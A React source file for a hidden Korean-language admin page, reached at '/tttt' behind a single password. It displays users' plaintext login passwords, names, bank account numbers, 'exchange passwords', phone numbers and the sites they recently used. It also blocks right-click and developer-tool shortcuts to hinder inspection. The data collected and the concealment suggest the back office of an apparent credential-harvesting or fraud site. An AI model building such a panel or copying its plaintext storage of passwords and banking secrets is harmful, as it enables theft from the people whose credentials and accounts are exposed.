import { useMemo, useState } from "react";
import * as React from "react";
import { trpc } from "@/lib/trpc";
import { Loader2, Search } from "lucide-react";

export default function Admin() {
  const [adminPassword, setAdminPassword] = useState("");
  const [submittedPassword, setSubmittedPassword] = useState("");
  const [search, setSearch] = useState("");

  React.useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
    };

    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 ||
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
        (e.ctrlKey && e.keyCode === 85)
      ) {
        e.preventDefault();
      }
    };

    document.addEventListener("contextmenu", handleContextMenu);
    document.addEventListener("keydown", handleKeyDown);

    return () => {
      document.removeEventListener("contextmenu", handleContextMenu);
      document.removeEventListener("keydown", handleKeyDown);
    };
  }, []);

  const usersQuery = trpc.shark.getUsers.useQuery(
    { adminPassword: submittedPassword },
    {
      enabled: Boolean(submittedPassword),
      retry: false,
      refetchOnWindowFocus: false,
    }
  );

  const filteredUsers = useMemo(() => {
    const users = usersQuery.data ?? [];
    if (!search.trim()) return users;
    const keyword = search.toLowerCase();
    return users.filter((user: any) =>
      [
        user.userId,
        user.password,
        user.nickname,
        user.name,
        user.bank,
        user.account,
        user.exchangePw,
        user.phone,
        user.recentSite,
        user.status,
      ]
        .filter(Boolean)
        .some((value) => String(value).toLowerCase().includes(keyword))
    );
  }, [usersQuery.data, search]);

  const handleOpen = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmittedPassword(adminPassword);
  };

  const cards = [
    { label: "전체 회원", value: usersQuery.data?.length ?? 0 },
    { label: "검색 결과", value: filteredUsers.length },
    { label: "대기 상태", value: (usersQuery.data ?? []).filter((u: any) => u.status === "pending").length },
  ];

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a2e5c] to-[#020b1a] p-4 md:p-6">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-4xl md:text-5xl font-black bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">
            관리자 페이지
          </h1>
          <p className="text-white/60 mt-2">/tttt 주소로 직접 접근한 뒤 관리자 비밀번호를 입력하면 회원가입 정보를 확인할 수 있습니다.</p>
        </div>

        <form onSubmit={handleOpen} className="bg-gradient-to-br from-blue-900/20 to-cyan-900/20 backdrop-blur-xl border border-cyan-500/20 rounded-3xl p-6 mb-6">
          <div className="grid grid-cols-1 md:grid-cols-[1fr_auto] gap-4 items-end">
            <div>
              <label className="block text-white/90 font-semibold text-sm mb-3">관리자 비밀번호</label>
              <input
                type="password"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="관리자 비밀번호를 입력하세요"
                className="w-full h-14 bg-white/10 border border-white/20 rounded-2xl px-5 text-white placeholder-white/30 focus:outline-none focus:bg-white/15 focus:border-cyan-400/50 transition-all text-base"
              />
            </div>
            <button
              type="submit"
              className="h-14 px-8 bg-gradient-to-r from-cyan-400 to-blue-500 text-gray-900 font-bold rounded-2xl hover:shadow-lg hover:shadow-cyan-500/40 transition-all"
            >
              열기
            </button>
          </div>
          {usersQuery.error && (
            <div className="mt-4 text-red-400 bg-red-500/10 rounded-xl px-4 py-3 text-sm">
              {usersQuery.error.message}
            </div>
          )}
        </form>

        {submittedPassword && !usersQuery.error && (
          <>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
              {cards.map((card) => (
                <div key={card.label} className="bg-white/10 border border-white/15 rounded-2xl p-5">
                  <div className="text-white/50 text-sm mb-1">{card.label}</div>
                  <div className="text-white text-3xl font-black">{card.value}</div>
                </div>
              ))}
            </div>

            <div className="bg-white/10 border border-white/15 rounded-2xl p-4 mb-6 flex items-center gap-3">
              <Search className="w-5 h-5 text-white/50" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="아이디, 이름, 계좌번호, 최근 사이트 등으로 검색"
                className="w-full bg-transparent text-white placeholder-white/40 focus:outline-none"
              />
            </div>
          </>
        )}

        {usersQuery.isLoading ? (
          <div className="flex justify-center items-center h-64">
            <Loader2 className="w-8 h-8 animate-spin text-cyan-400" />
          </div>
        ) : submittedPassword && !usersQuery.error ? (
          <div className="overflow-x-auto rounded-3xl border border-white/10 bg-black/10 backdrop-blur">
            <table className="w-full min-w-[1400px] text-sm text-white/85">
              <thead className="bg-white/10 border-b border-white/10">
                <tr>
                  <th className="px-4 py-4 text-left font-semibold">아이디</th>
                  <th className="px-4 py-4 text-left font-semibold">비밀번호</th>
                  <th className="px-4 py-4 text-left font-semibold">닉네임</th>
                  <th className="px-4 py-4 text-left font-semibold">이름</th>
                  <th className="px-4 py-4 text-left font-semibold">은행</th>
                  <th className="px-4 py-4 text-left font-semibold">계좌번호</th>
                  <th className="px-4 py-4 text-left font-semibold">환전 비밀번호</th>
                  <th className="px-4 py-4 text-left font-semibold">휴대폰번호</th>
                  <th className="px-4 py-4 text-left font-semibold">최근 이용중인 사이트</th>
                  <th className="px-4 py-4 text-left font-semibold">상태</th>
                  <th className="px-4 py-4 text-left font-semibold">가입일</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/10">
                {filteredUsers.map((user: any) => (
                  <tr key={user.id} className="hover:bg-white/5 transition align-top">
                    <td className="px-4 py-4 whitespace-nowrap">{user.userId || "-"}</td>
                    <td className="px-4 py-4 break-all max-w-[180px]">{user.password || "-"}</td>
                    <td className="px-4 py-4 whitespace-nowrap">{user.nickname || "-"}</td>
                    <td className="px-4 py-4 whitespace-nowrap">{user.name || "-"}</td>
                    <td className="px-4 py-4 whitespace-nowrap">{user.bank || "-"}</td>
                    <td className="px-4 py-4 break-all max-w-[160px]">{user.account || "-"}</td>
                    <td className="px-4 py-4 break-all max-w-[160px]">{user.exchangePw || "-"}</td>
                    <td className="px-4 py-4 whitespace-nowrap">{user.phone || "-"}</td>
                    <td className="px-4 py-4 break-all max-w-[220px]">{user.recentSite || "-"}</td>
                    <td className="px-4 py-4 whitespace-nowrap">{user.status || "-"}</td>
                    <td className="px-4 py-4 whitespace-nowrap">{user.createdAt ? new Date(user.createdAt).toLocaleString("ko-KR") : "-"}</td>
                  </tr>
                ))}
              </tbody>
            </table>
            {filteredUsers.length === 0 && (
              <div className="text-center text-white/50 py-12">가입된 회원 정보가 없습니다.</div>
            )}
          </div>
        ) : null}
      </div>
    </div>
  );
}
